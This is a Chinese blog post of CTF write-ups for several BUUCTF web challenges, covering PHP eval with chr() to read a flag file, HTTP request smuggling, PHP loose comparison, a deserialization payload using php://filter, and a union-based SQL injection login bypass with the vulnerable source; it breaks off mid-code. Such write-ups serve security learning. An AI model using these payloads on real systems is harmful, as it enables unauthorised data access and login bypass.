<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="BUUCTF ———— two, Atmujie">
    <meta name="description" content="有一美人兮，见之不忘，一日不见兮，思之如狂；">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>BUUCTF ———— two | Atmujie</title>
    <link rel="icon" type="image/png" href="/weblogo.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Atmujie</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/friends">
          
          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Friends</span>
        </a>
      </li>
      
      <li>
        <a href="/BlogLink">
          
          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>BlogLink</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Atmujie</div>
        <div class="logo-desc">
            
            有一美人兮，见之不忘，一日不见兮，思之如狂；
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-address-book"></i>
			
			友情链接
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/friends " style="margin-left:75px">
				  
				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
			      
		          <span>Friends</span>
                  </a>
                </li>
              
                <li>

                  <a href="/BlogLink " style="margin-left:75px">
				  
				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
			      
		          <span>BlogLink</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">BUUCTF ———— two</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-06-14
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="BUUCTF-：-二"><a href="#BUUCTF-：-二" class="headerlink" title="BUUCTF  ： 二"></a>BUUCTF  ： 二</h1><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><h3 id="vardump-scandir-与chr"><a href="#vardump-scandir-与chr" class="headerlink" title="vardump(),scandir()与chr()"></a>vardump(),scandir()与chr()</h3><p>根据提示，直接入calc.php文件，发现不能传num</p>
<p>wp说因为上了waf，不允许上传num,所以要使用?+num</p>
<p>查看phpinfo()，发现函数禁用的很严，所以考虑蚁剑绕过或者函数执行</p>
<p>这里有两种思路，先说第一种</p>
<p>eval可以执行函数</p>
<p>scandir()函数用于列出一个目录下的所有文件和目录</p>
<p>var_dump()函数将所得内容变为数组，可以让eval中的echo 不会报错</p>
<p>chr()可以绕过正则匹配，输出特殊符号</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span> num<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20210615163731026.png" alt="image-20210615163731026"></p>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{03b267fb-8fd1-44a3-a535-bcd08f8826fb} 
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="思路二：HTTP请求走私"><a href="#思路二：HTTP请求走私" class="headerlink" title="思路二：HTTP请求走私"></a>思路二：HTTP请求走私</h3><p>原文地址</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a></p>
<p>HTTP 请求走私是一种干扰网站处理从一个或多个用户收到的 HTTP 请求序列方式的技术。请求走私漏洞在本质上通常很关键，允许攻击者绕过安全控制，未经授权访问敏感数据，并直接危害其他应用程序用户。</p>
<h4 id="HTTP请求走私漏洞是如何产生的？"><a href="#HTTP请求走私漏洞是如何产生的？" class="headerlink" title="HTTP请求走私漏洞是如何产生的？"></a>HTTP请求走私漏洞是如何产生的？</h4><p>大多数 HTTP 请求走私漏洞的出现是因为 HTTP 规范提供了两种不同的方式来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。</p>
<p>该<code>Content-Length</code>头是直接的：它指定消息体的以字节为单位的长度。例如：</p>
<pre class="line-numbers language-http"><code class="language-http">POST /search HTTP/1.1
<span class="token header-name keyword">Host:</span> normal-website.com
<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded
<span class="token header-name keyword">Content-Length:</span> 11

q=smuggling
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该<code>Transfer-Encoding</code>首标可以被用于指定该消息体的用途分块编码。这意味着消息正文包含一个或多个数据块。每个块由以字节为单位的块大小（以十六进制表示）、后跟换行符和块内容组成。消息以大小为零的块终止。例如：</p>
<pre class="line-numbers language-http"><code class="language-http">POST /search HTTP/1.1
<span class="token header-name keyword">Host:</span> normal-website.com
<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded
<span class="token header-name keyword">Transfer-Encoding:</span> chunked

b
q=smuggling
0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>由于 HTTP 规范提供了两种不同的方法来指定 HTTP 消息的长度，因此单个消息可能会同时使用这两种方法，从而导致它们相互冲突。HTTP 规范试图通过声明如果<code>Content-Length</code>和<code>Transfer-Encoding</code>标头都存在，<code>Content-Length</code>则应忽略标头来防止此问题。当只有一个服务器在运行时，这可能足以避免歧义，但当两个或多个服务器链接在一起时则不然。在这种情况下，出现问题的原因有两个：</p>
<ul>
<li>某些服务器不支持<code>Transfer-Encoding</code>请求中的标头。</li>
<li><code>Transfer-Encoding</code>如果标头以某种方式被混淆，一些 支持标头的服务器可能会被诱导不处理它。</li>
</ul>
<p>如果前端和后端服务器在（可能被混淆的）<code>Transfer-Encoding</code> 标头方面的行为不同，那么它们可能会在连续请求之间的边界上存在分歧，从而导致请求走私漏洞。</p>
<p>请求走私攻击涉及将<code>Content-Length</code>标头和<code>Transfer-Encoding</code> 标头放入单个 HTTP 请求并对其进行操作，以便前端和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p>
<ul>
<li>CL.TE：前端服务器使用<code>Content-Length</code>头部，后端服务器使用<code>Transfer-Encoding</code>头部。</li>
<li>TE.CL：前端服务器使用<code>Transfer-Encoding</code>头部，后端服务器使用<code>Content-Length</code>头部。</li>
<li>TE.TE：前端和后端服务器都支持<code>Transfer-Encoding</code>头部，但可以通过某种方式混淆头部来诱导其中一个服务器不处理它。</li>
</ul>
<p>本题所有的方法都可以用</p>
<p>先发送一个POST</p>
<p><img src="image-20210616151512591.png" alt="image-20210616151512591"></p>
<p>确认存在，然后直接构造请求</p>
<p><img src="image-20210616151714993.png" alt="image-20210616151714993"></p>
<p><img src="image-20210616151738397.png" alt="image-20210616151738397"></p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>这里懒得扫，看了眼wp，访问index.php.bak即可</p>
<p><img src="image-20210619122452686.png" alt="image-20210619122452686"></p>
<h3 id="php弱等于特性"><a href="#php弱等于特性" class="headerlink" title="php弱等于特性"></a>php弱等于特性</h3><p>计算机语言的等号分三种 =   ==   ===</p>
<p>一个等于是赋值，重点再两个和三个上</p>
<p>=== 是强等于，只有强等于两边的变量完全一致时（数值，类型）返回对</p>
<p>== 是弱等于，在比较字符和数字时，会将字符先转换为数字，再比较</p>
<p>这里if语句使用了弱等于，所以实际是比较了 $key == 123</p>
<p>get 传参123即可</p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">?key=123
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20210619122622482.png" alt="image-20210619122622482"></p>
<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{56416317-b54a-4ed5-8530-243719543ec0}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="强等于绕过"><a href="#强等于绕过" class="headerlink" title="强等于绕过"></a>强等于绕过</h3><p>第一步没什么好说的，就看观察的够不够仔细</p>
<p><img src="image-20210624135703152.png" alt="image-20210624135703152"></p>
<p>这里在结束脚本时将op重新赋值为一，但使用的是强等于，并且1用双引号包裹，故这里的1为str</p>
<p>往上看</p>
<p><img src="image-20210624135826246.png" alt="image-20210624135826246"></p>
<p>类中对op的比较，使用的是弱等于</p>
<p>所以只需要将op赋值为int 2即可</p>
<p><img src="image-20210624140102908.png" alt="image-20210624140102908"></p>
<p><img src="image-20210624140156077.png" alt="image-20210624140156077"></p>
<p>成功绕过</p>
<h3 id="基于php7以上对类型的不敏感绕过字符限制"><a href="#基于php7以上对类型的不敏感绕过字符限制" class="headerlink" title="基于php7以上对类型的不敏感绕过字符限制"></a>基于php7以上对类型的不敏感绕过字符限制</h3><p><img src="image-20210624140317864.png" alt="image-20210624140317864"></p>
<p>is_valid函数限制了输入的字符ascii范围，而protected类型和provate类型在序列化时会生成不可见字符，这些字符是超出范围的</p>
<p>对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。</p>
<p><img src="image-20210624140932629.png" alt="image-20210624140932629"></p>
<p><img src="image-20210624140949731.png" alt="image-20210624140949731"></p>
<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">?str=O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20210624141046524.png" alt="image-20210624141046524"></p>
<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{98dce919-5a41-4e00-8266-6644e2d6a67b}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>各种角度都很无聊的一道题</p>
<p>心累了，毁灭吧，赶紧的</p>
<h3 id="order-by-比较盲注（假）"><a href="#order-by-比较盲注（假）" class="headerlink" title="order by 比较盲注（假）"></a>order by 比较盲注（假）</h3><p>源码告诉我们注入位置</p>
<p><img src="image-20210624165640871.png" alt="image-20210624165640871"></p>
<p>解码这串字符串，告诉我们是单引号闭合</p>
<p><img src="image-20210624165741313.png" alt="image-20210624165741313"></p>
<p>先base32再base64,但不解码同样试的出来</p>
<p>然后burp爆破模块测试过滤</p>
<p><strong><img src="image-20210624170018142.png" alt="image-20210624170018142"></strong></p>
<p>嗯，括号，明显是order by比较盲注</p>
<p>不过这里同样过滤了or，测试一下</p>
<p><img src="image-20210624170139146.png" alt="image-20210624170139146"></p>
<p>可以大小写绕过，那么接下来就是写脚本了</p>
<p>然而，写个锤子，跑一半就崩溃</p>
<p><img src="image-20210624170637269.png" alt="image-20210624170637269"></p>
<p>直接抄wp，有兴趣的朋友自己写吧，倦了</p>
<p>骗你的，比较个鬼</p>
<h3 id="逻辑漏洞，union-联合绕过"><a href="#逻辑漏洞，union-联合绕过" class="headerlink" title="逻辑漏洞，union 联合绕过"></a>逻辑漏洞，union 联合绕过</h3><p>可能order by的确是种方法，但当我看了wp，我想打出题人</p>
<p><img src="image-20210624172707285.png" alt="image-20210624172707285"></p>
<p>wp是这么说的，让我万分好奇，啥情况？咋绕的？盲注出md5然后登录？</p>
<p>本这好奇心一定要满足的原则，我找了本题的源代码</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span> 
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span><span class="token keyword">Do</span> you know who am I<span class="token operator">?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span>
<span class="token keyword">require</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>
<span class="token keyword">require</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 去除转义</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">stripslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span>
        <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'stripslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>
        <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$_POST</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'stripslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_GET</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'stripslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_COOKIE</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'stripslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_REQUEST</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'stripslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">'SET NAMES UTF8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$t_pw</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from user where username = '"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// echo $sql;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\(|\)|\=|or/"</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"do not hack me!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error: %s\n"</span><span class="token punctuation">,</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// echo '</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span>
        <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// print_r($arr);</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"wrong pass!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"wrong user!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我来分析一下</p>
<p><img src="image-20210624173041131.png" alt="image-20210624173041131"></p>
<p>先用username怼数据库理把数据拿出来</p>
<p>然后(!$result)看看数据是否真的拿出来了，没拿出来给你个报错(有报错虽好，可惜没卵用)</p>
<p>接着看看输入的name是不是admin，如果是，再比较password值的MD5是否等于数据库里存的md5</p>
<p>看着是没问题，但是</p>
<p>正常人谁把数据提出来才比较</p>
<p>那么这里就有一个逻辑漏洞</p>
<p>我们不需要明确知道密码，我们只需要让我们输入的密码md5值确实存在于数据库里</p>
<p>于是这里回归了那些感觉不清不楚的wp</p>
<pre class="line-numbers language-payload"><code class="language-payload">name=1' union select 0,'admin','e10adc3949ba59abbe56e057f20f883e' %23 &pw=123456
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这是wp中的payload,看似的确是union伪造了身份，但是</p>
<p>根本不是，这是逻辑漏洞</p>
<p>当<code>name=1&#39; union select 0,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39; %23</code>时，<code>$result</code>得到了一个虚拟表</p>
<p><img src="image-20210624174714436.png" alt="image-20210624174714436"></p>
<p>就像这样，这个代码实际得到的，是这样的数组</p>
<p>然后开始比较，<code>$arr[1]=admin</code>，也就是虚拟表第二列值要为admin</p>
<p><code>$arr[2]=md5(password)</code>,虚拟表第三列值为password的MD5值</p>
<p><strong>漏洞来了，这个password，不是数据库里的password，而是我们输入的pw</strong></p>
<p><strong>只要我们输入的pw值在md5后和虚拟表中的password相等，就可以拿到flag,根本不需要知道真正的密码</strong></p>
<p>wp中用烂的payload,真正告诉我们的是这个意思</p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><p>那么知道了原理，我们甚至可以这么构造</p>
<pre class="line-numbers language-payload"><code class="language-payload">name=1' union select 0,'admin','6eea9b7ef19179a06954edd0f6c05ceb' %23 &pw=qwertyuiop
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20210624175619363.png" alt="image-20210624175619363"></p>
<h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{d56882af-5da5-48db-a589-e8ae11e5189f}
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可能我不该说出题人不对，或许出题人就是在这么考呢，没猜到源代码逻辑是我不对（确信）</p>
<h2 id="Black-Watch-入群题-Web2"><a href="#Black-Watch-入群题-Web2" class="headerlink" title="[Black Watch 入群题]Web2"></a>[Black Watch 入群题]Web2</h2><h2 id="with-rollup注入"><a href="#with-rollup注入" class="headerlink" title="with rollup注入"></a>with rollup注入</h2><p><img src="image-20211029133357488.png" alt="image-20211029133357488"></p>
<p>经典登录，就是不知道怎么进去</p>
<h3 id="猜测sql语句"><a href="#猜测sql语句" class="headerlink" title="猜测sql语句"></a>猜测sql语句</h3><p>sql注入先猜测语句</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//正常思路先建立连接</span>
